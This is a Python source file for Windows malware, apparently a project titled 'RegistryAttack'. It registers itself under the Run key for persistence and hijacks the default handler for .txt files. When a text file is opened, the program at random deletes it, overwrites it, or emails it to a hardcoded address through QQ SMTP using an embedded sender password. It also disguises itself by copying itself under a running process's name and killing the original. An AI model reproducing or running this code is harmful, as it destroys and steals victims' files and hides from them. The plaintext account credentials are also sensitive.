import win32api
import win32con
import win32security
import sys
import os
import psutil
import random
from subprocess import run
import pywintypes
import smtplib
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.header import Header
from datetime import datetime

import write_log

pro_pid = os.getpid()
saved_key = []
file_dir = os.path.dirname(sys.argv[0])
file_path = os.path.abspath(sys.argv[0])
pro_name = ''

#取得备份注册表权限
def privilege_promote_backup():
    flags = win32security.TOKEN_ADJUST_PRIVILEGES|win32security.TOKEN_QUERY
    token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), flags)
    id_flag = win32security.LookupPrivilegeValue(None, win32security.SE_BACKUP_NAME)
    privilege = [(id_flag, win32security.SE_PRIVILEGE_ENABLED)]
    win32security.AdjustTokenPrivileges(token, False, privilege)
    write_log.write_log(str(pro_pid) + '#' + str(datetime.now()) + ' ---> 申请备份注册表权限成功\n')

def privilege_promote_restore():
    flags = win32security.TOKEN_ADJUST_PRIVILEGES|win32security.TOKEN_QUERY
    token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), flags)
    id_flag = win32security.LookupPrivilegeValue(None, win32security.SE_RESTORE_NAME)
    privilege = [(id_flag, win32security.SE_PRIVILEGE_ENABLED)]
    win32security.AdjustTokenPrivileges(token, False, privilege)
    write_log.write_log(str(pro_pid) + '#' + str(datetime.now()) + ' ---> 申请恢复注册表权限成功\n')

#自启动
def self_start(is_start):
    start_key = win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
                                      0, win32con.KEY_ALL_ACCESS)
    if start_key and is_start:
        try:
            win32api.RegSaveKeyEx(start_key, file_dir + '/saved_key_start')
        except pywintypes.error:
            pass
        saved_key.append(
            (win32con.HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 'saved_key_start'))
        win32api.RegSetValueEx(start_key, 'Registry_Attack', 0, win32con.REG_SZ, file_path)
    win32api.RegCloseKey(start_key)
    write_log.write_log(str(pro_pid) + '#' + str(datetime.now()) + ' ---> 添加自启动项成功\n')

#修改txt文件打开方式
def modify_registry_txt():
    modify_attack_key = win32api.RegOpenKeyEx(win32con.HKEY_CLASSES_ROOT, 'txtfile\shell\open\command', 0,
                                              win32con.KEY_ALL_ACCESS)
    try:
        win32api.RegSaveKey(modify_attack_key, file_dir + '/saved_key_modify')
    except pywintypes.error:
        pass
    saved_key.append((win32con.HKEY_CLASSES_ROOT, 'txtfile\shell\open\command', 'saved_key_modify'))
    win32api.RegSetValueEx(modify_attack_key, '', 0, win32con.REG_SZ, file_path + ' %1')
    win32api.RegCloseKey(modify_attack_key)
    write_log.write_log(str(pro_pid) + '#' + str(datetime.now()) + ' ---> 修改txt文件默认打开方式成功\n')

#将saved_key内容写入txt文件
def create_key_txt():
    global saved_key
    try:
        fp = open(file_dir + "/saved_key.txt", 'r')
        txt_len = len(saved_key)
        saved_key = []
        read = fp.readline().split('\n')
        for key in range(0, txt_len):
            saved_key.append(read[0].split(' '))
        write_log.write_log(str(pro_pid) + '#' + str(datetime.now()) + ' ---> 备份文件已存在：已准备好恢复文件\n')
    except FileNotFoundError:
        fp = open(file_dir + "/saved_key.txt", 'w')
        for key in saved_key:
            fp.writelines(str(key[0]) + ' ' + str(key[1]) + ' ' + str(key[2]))
            fp.write('\n')
        write_log.write_log(str(pro_pid) + '#' + str(datetime.now()) + ' ---> 已创建并写好备份文件\n')
    fp.close()

#恢复注册表
def recover_registry():
    for _saved_key in saved_key:
        win32api.RegRestoreKey(win32api.RegOpenKeyEx(int(_saved_key[0]), ''.join(str(_saved_key[1])), 0,
                                                     win32con.KEY_ALL_ACCESS), ''.join(str(_saved_key[2])),
                               0x00000008)

#发送qq邮件
def send_qq_mail(files):
    smtp = 'smtp.qq.com'
    sender = '2305495282@qq.com'
    receiver = '13777848073@163.com'
    pwd = 'pybnhahwdfnkecbc'
    text = MIMEText('已经获取到的信息： ', 'plain', 'utf-8')
    mail = MIMEMultipart()
    mail.attach(text)
    title = ''
    if type(files) == type(list()):
        title = 'ScreenShot'
        for file in files:
            attach_file = MIMEApplication(open(str(file), 'rb').read())
            attach_file.add_header('Content-Disposition', 'attachment', filename=str(file).split('\\')[-1])
            mail.attach(attach_file)
    elif type(files) == type(str()):
        title = 'GetTxtFile'
        attach_file = MIMEApplication(open(str(files), 'rb').read())
        attach_file.add_header('Content-Disposition', 'attachment', filename=str(files).split('\\')[-1])
        mail.attach(attach_file)

    mail['From'] = Header(sender, 'utf-8')
    mail['To'] = Header(receiver, 'utf-8')
    mail['Subject'] = Header(title, 'utf-8')

    try:
        server = smtplib.SMTP_SSL(smtp, 465)
        server.login(sender, pwd)
        server.sendmail(sender, receiver, mail.as_string())
        write_log.write_log(str(pro_pid) + '#' + str(datetime.now()) + ' ---> 文件已被发送到邮箱\n')
        server.quit()
    except smtplib.SMTPException :
        write_log.write_log(str(pro_pid) + '#' + str(datetime.now()) + ' ---> 文件发送失败\n')

#破坏txt文件内容
def destroy_txt():
    destroy_way = random.choice(['remove_txt', 'over_write_txt','send_txt'])
    if sys.argv[1].split('\\')[-1] != 'saved_key.txt':
        if destroy_way == 'remove_txt':
            try:
                os.remove(sys.argv[1])
                write_log.write_log(str(pro_pid) + '#' + str(datetime.now()) + ' ---> ' + str(sys.argv[1]) + ' txt已被移除\n')
            except OSError as e:
                write_log.write_log(str(pro_pid) + '#' + str(datetime.now()) + ' ---> ' + str(sys.argv[1]) + ' txt移除失败：'  + str(e) + '\n')
        elif destroy_way == 'over_write_txt':
            try:
                fp = open(sys.argv[1], 'w')
                fp.write('**********************************\n')
                fp.write('*   The Txt File Is Destroyed    *\n')
                fp.write('**********************************\n')
                fp.close()
                write_log.write_log(str(pro_pid) + '#' + str(datetime.now()) + ' ---> ' + str(sys.argv[1]) + ' txt已被篡改\n')
                run('notepad ' + sys.argv[1], shell=True)
            except PermissionError as e :
                write_log.write_log(str(pro_pid) + '#' + str(datetime.now()) + ' ---> ' + str(sys.argv[1]) + ' txt篡改失败：' + str(e) + '\n')
        elif destroy_way == 'send_txt':
            send_qq_mail(sys.argv[1])
            write_log.write_log(
                str(pro_pid) + '#' + str(datetime.now()) + ' ---> ' + str(sys.argv[1]) + ' txt已被发送到邮箱\n')
            run('notepad ' + sys.argv[1], shell=True)
    else:
        run('notepad ' + sys.argv[1], shell=True)
        write_log.write_log(str(pro_pid) + '#' + str(datetime.now()) + ' ---> 目标查看了key文件\n')

#伪装进程后杀掉自身
def kill_self():
    write_log.write_log(str(pro_pid) + '#' + str(datetime.now()) + ' ---> 成功杀死自身\n')
    run('taskkill /pid ' + str(pro_pid)  + ' -f', shell=True)

#伪造进程
#copy self -- awake copy exe-- kill self
def forge_process(forge_way):
    global pro_name
    process_list = []
    for process in psutil.process_iter():
        if pro_pid != process.pid:
            process_list.append(process.name())
        else:
            pro_name = process.name()
    if forge_way == 1 and pro_name == 'play.exe':
        name = random.choice(process_list)
        copy_file_path = file_path.split('\\')[0:-1]
        copy_file_path = '\\'.join(copy_file_path) + '\\' + str(name)
        run('copy ' + file_path + ' ' + copy_file_path, shell=True)
        write_log.write_log(str(pro_pid) + '#' + str(datetime.now()) + ' ---> 进程伪造成功\n')
        os.startfile(copy_file_path)
        kill_self()
    else:
        write_log.write_log(str(pro_pid) + '#' + str(datetime.now()) + ' ---> 已经是伪装进程：' + pro_name + '\n')

if __name__ == '__main__':
    #privilege_promote_backup()
    #privilege_promote_restore()
    #forge_process(1)
    # print(sys.argv[1])
    self_start(True)
    #create_key_txt()
    #recover_registry()
    #modify_registry_txt()
    #sys.argv.append('C:\\Users\周以龙\PycharmProjects\RegistryAttack\\2.txt')
    #destroy_txt()
